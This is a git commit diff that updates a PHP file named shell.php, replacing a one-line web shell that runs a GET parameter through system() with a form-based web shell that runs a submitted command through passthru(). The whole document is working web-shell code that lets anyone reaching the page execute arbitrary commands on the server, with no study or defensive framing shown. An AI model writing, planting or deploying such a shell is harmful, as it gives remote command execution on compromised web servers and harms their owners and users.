c6526a7dc84b4bd558bd1f9a4af4c69f76dbcb69
mutex0608 <131944344+mutex0608@users.noreply.github.com>
2024-01-10 14:41:15 +0900

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,5 +1,11 @@
-<?php
+<? 
 
-system($_GET[cmd]);
+        echo "
+                <FORM ACTION=$PHP_SELF METHOD=POST>
+                CMD : <INPUT TYPE=TEXT NAME=command SIZE=40>
+                <INPUT TYPE=SUBMIT VALUE='Enter'></FORM>
+                <HR><XMP></XMP><HR>";
 
+        $command = str_replace('/', '', $command);
+        echo "<XMP>"; passthru($command); echo "</XMP>";
 ?>
